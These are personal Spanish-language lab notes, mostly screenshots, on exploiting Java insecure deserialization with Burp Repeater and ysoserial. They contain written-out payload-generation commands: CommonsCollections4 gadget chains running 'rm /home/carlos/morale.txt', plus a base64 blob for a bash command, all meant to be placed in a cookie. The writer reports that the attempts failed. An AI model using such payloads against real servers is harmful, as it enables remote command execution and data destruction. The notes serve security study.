![[Pasted image 20220928193812.png]]

![[Pasted image 20220928194053.png]]

![[Pasted image 20220928194144.png]]

mandamos el GET request al repeater:

![[Pasted image 20220928194235.png]]

![[Pasted image 20220928194315.png]]

descargo la herramienta ysoserial.jar de aca (https://github.com/summitt/burp-ysoserial/releases) o la instalo desde el Bapp Store:

![[Pasted image 20220928194548.png]]

desde la linea de comandos uso la siguiente:

![[Pasted image 20220928194934.png]]

....

![[Pasted image 20220928194952.png]]

Z2VuZXJhdGluZyBwYXlsb2FkIG9iamVjdChzKSBmb3IgY29tbWFuZDogJ2Jhc2gsLC1jLCxlY2hvICJ0ZXN0IiA+IC90bXAveW9zby50eHQnCnNlcmlhbGl6aW5nIHBheWxvYWQKZGVzZXJpYWxpemluZyBwYXlsb2FkCg==

esta cookie la voy a agregar en la casilla value (originalmente estaba vacia):

![[Pasted image 20220928195222.png]]

al presionar Apply changes el request se actualiza, lo vuelvo a mandar:

![[Pasted image 20220928195316.png]]

indudablemente no funciono porque olvide incluir el tipo de payload, en todo caso la linea que debi utilizar es:

java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

![[Pasted image 20220929171759.png]]

en todo caso me llama la atencion que la key generada es muy corta:

![[Pasted image 20220929172018.png]]


en cambio, encontre en este sitio: https://github.com/frohoff/ysoserial una version distinta y el payload si parece mas congruente:

java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

![[Pasted image 20220929172043.png]]

por la longitud lo voy a pasar a un archivo:

![[Pasted image 20220929172221.png]]

esta vez el payload fue super grande pero tampoco funciono.